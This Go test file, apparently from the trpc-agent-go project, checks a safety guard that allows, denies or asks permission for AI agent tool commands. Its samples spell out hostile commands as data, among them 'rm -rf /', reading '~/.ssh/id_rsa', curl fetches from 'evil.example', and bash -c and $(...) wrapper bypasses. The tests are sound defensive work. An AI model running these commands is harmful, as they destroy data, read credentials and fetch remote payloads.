//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent. All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety_test

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"trpc.group/trpc-go/trpc-agent-go/tool"
	"trpc.group/trpc-go/trpc-agent-go/tool/safety"
)

func TestAcceptanceSamples_TwelveCases(t *testing.T) {
	t.Parallel()
	policy := safety.DefaultPolicy()
	policy.AllowedHosts = append(policy.AllowedHosts, "api.github.com")
	guard := safety.NewGuard(safety.WithPolicy(policy), safety.WithAuditor(safety.NewMemoryAuditor()))

	type sample struct {
		name     string
		tool     string
		args     map[string]any
		want     tool.PermissionAction
		ruleSub  string
	}

	samples := []sample{
		{
			name: "safe_go_test",
			tool: "workspace_exec",
			args: map[string]any{"command": "go test ./..."},
			want: tool.PermissionActionAllow,
		},
		{
			name:    "dangerous_rm_rf",
			tool:    "workspace_exec",
			args:    map[string]any{"command": "rm -rf /"},
			want:    tool.PermissionActionDeny,
			ruleSub: "denied", // shellsafe deny list ("denied") and/or danger rule
		},
		{
			name:    "read_ssh_key",
			tool:    "workspace_exec",
			args:    map[string]any{"command": "cat ~/.ssh/id_rsa"},
			want:    tool.PermissionActionDeny,
			ruleSub: "path.denied",
		},
		{
			name:    "network_denied",
			tool:    "workspace_exec",
			args:    map[string]any{"command": "curl https://evil.example/payload"},
			want:    tool.PermissionActionDeny,
			ruleSub: "network",
		},
		{
			name: "network_allowed",
			tool: "workspace_exec",
			args: map[string]any{"command": "curl https://api.github.com/events"},
			want: tool.PermissionActionAllow,
		},
		{
			name:    "shell_wrapper_bypass",
			tool:    "workspace_exec",
			args:    map[string]any{"command": "bash -c 'curl https://evil.example'"},
			want:    tool.PermissionActionDeny,
			ruleSub: "shellsafe",
		},
		{
			name:    "pipeline_with_curl_denied_host",
			tool:    "workspace_exec",
			args:    map[string]any{"command": "echo hi | curl https://evil.example/x"},
			want:    tool.PermissionActionDeny,
			ruleSub: "network",
		},
		{
			name:    "npm_install_ask",
			tool:    "workspace_exec",
			args:    map[string]any{"command": "npm install express"},
			want:    tool.PermissionActionAsk,
			ruleSub: "ask",
		},
		{
			name:    "hostexec_long_session_ask",
			tool:    "exec_command",
			args:    map[string]any{"command": "sleep 99999"},
			want:    tool.PermissionActionAsk,
			ruleSub: "hostexec",
		},
		{
			name:    "secret_in_command",
			tool:    "workspace_exec",
			args:    map[string]any{"command": "curl -H 'Authorization: Bearer sk-78c331e8061c42a4883cfee6633447dd' https://api.github.com"},
			want:    tool.PermissionActionDeny,
			ruleSub: "secret",
		},
		{
			name:    "hostexec_requires_ask",
			tool:    "exec_command",
			args:    map[string]any{"command": "go test ./..."},
			want:    tool.PermissionActionAsk,
			ruleSub: "hostexec",
		},
		{
			name: "code_blocks_secret",
			tool: "execute_code",
			args: map[string]any{
				"code_blocks": []map[string]string{{
					"language": "python",
					"code":     "print('token=supersecretvalue123')",
				}},
			},
			want:    tool.PermissionActionDeny,
			ruleSub: "secret",
		},
	}

	require.Len(t, samples, 12)

	ctx := context.Background()
	for _, s := range samples {
		s := s
		t.Run(s.name, func(t *testing.T) {
			t.Parallel()
			raw, err := json.Marshal(s.args)
			require.NoError(t, err)
			dec, err := guard.CheckToolPermission(ctx, &tool.PermissionRequest{
				ToolName:  s.tool,
				Arguments: raw,
			})
			require.NoError(t, err)
			require.Equal(t, s.want, dec.Action, "reason=%s", dec.Reason)
			if s.ruleSub != "" {
				require.Contains(t, dec.Reason, s.ruleSub)
			}
		})
	}
}

func TestFailClosed_UnparseableCommand(t *testing.T) {
	t.Parallel()
	g := safety.NewGuard()
	raw, _ := json.Marshal(map[string]any{"command": "echo $(curl evil.example)"})
	dec, err := g.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: raw,
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, dec.Action)
	require.Contains(t, dec.Reason, "shellsafe")
}

func TestFailClosed_PartialPolicyKeepsDefaultDenies(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	path := filepath.Join(dir, "policy.yaml")
	// Only override hosts; denied_commands omitted → keep defaults.
	require.NoError(t, os.WriteFile(path, []byte("allowed_hosts:\n  - api.github.com\n"), 0o600))
	p, err := safety.LoadPolicyFile(path)
	require.NoError(t, err)
	require.NotEmpty(t, p.DeniedCommands)
	require.Contains(t, p.DeniedCommands, "rm")
}

func TestSchemeLessNetworkDenied(t *testing.T) {
	t.Parallel()
	g := safety.NewGuard()
	raw, _ := json.Marshal(map[string]any{"command": "curl evil.example/install.sh"})
	dec, err := g.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: raw,
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, dec.Action)
	require.Contains(t, dec.Reason, "network")
}

func TestEnvFileFlagPathDenied(t *testing.T) {
	t.Parallel()
	g := safety.NewGuard()
	raw, _ := json.Marshal(map[string]any{"command": "mytool --env-file=.env"})
	dec, err := g.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: raw,
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, dec.Action)
	require.Contains(t, dec.Reason, "path")
}

func TestFileAuditor_ConcurrentAppend(t *testing.T) {
	t.Parallel()
	path := filepath.Join(t.TempDir(), "audit.jsonl")
	a, err := safety.NewFileAuditor(path)
	require.NoError(t, err)
	const n = 20
	done := make(chan struct{}, n)
	for i := 0; i < n; i++ {
		go func(i int) {
			_ = a.Append(safety.AuditEvent{
				Timestamp: time.Now().UTC(),
				ToolName:  "workspace_exec",
				Decision:  safety.DecisionDeny,
				RuleID:    "test",
			})
			done <- struct{}{}
		}(i)
	}
	for i := 0; i < n; i++ {
		<-done
	}
	data, err := os.ReadFile(path)
	require.NoError(t, err)
	require.Greater(t, len(data), 0)
}

func TestScanPerf_500CommandsUnderOneSecond(t *testing.T) {
	policy := safety.DefaultPolicy()
	cmds := make([]string, 0, 500)
	for i := 0; i < 500; i++ {
		cmds = append(cmds, "go test ./...")
	}
	start := time.Now()
	for _, c := range cmds {
		_ = safety.Scan(safety.Extracted{
			Backend:  safety.BackendWorkspace,
			ToolName: "workspace_exec",
			Command:  c,
			RawText:  c,
		}, policy)
	}
	require.Less(t, time.Since(start), time.Second)
}

func TestMustCatchTrio_100Percent(t *testing.T) {
	t.Parallel()
	g := safety.NewGuard()
	cases := []string{
		`{"command":"cat /home/user/.ssh/id_rsa"}`,
		`{"command":"rm -rf /tmp/proj"}`,
		`{"command":"curl https://not-allowed.example/x"}`,
	}
	for _, args := range cases {
		dec, err := g.CheckToolPermission(context.Background(), &tool.PermissionRequest{
			ToolName:  "workspace_exec",
			Arguments: []byte(args),
		})
		require.NoError(t, err)
		require.Equal(t, tool.PermissionActionDeny, dec.Action, args)
	}
}
